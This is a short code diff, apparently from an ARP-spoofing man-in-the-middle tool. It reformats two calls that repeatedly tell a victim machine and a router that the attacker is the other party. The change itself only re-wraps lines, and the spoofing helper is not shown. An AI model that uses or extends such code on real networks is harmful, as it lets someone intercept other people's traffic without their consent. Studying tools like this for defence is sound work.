@@ -111,10 +111,16 @@ def send_spoof_packages():
                     interceptor     = spoofed['interceptor']
 
                     # Send Packet to the Victim to Say I am the Router
-                    redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,interceptor)
+                    redirect_arp(target_ip_addr,
+                                 target_mac_addr,
+                                 router_ip_addr,
+                                 interceptor)
 
                     # Send Packet to the Router to Say I am the Victim
-                    redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,interceptor)
+                    redirect_arp(router_ip_addr,
+                                 router_mac_addr,
+                                 target_ip_addr,
+                                 interceptor)
 
                 time.sleep(SLEEP_TIME)
     # Threading
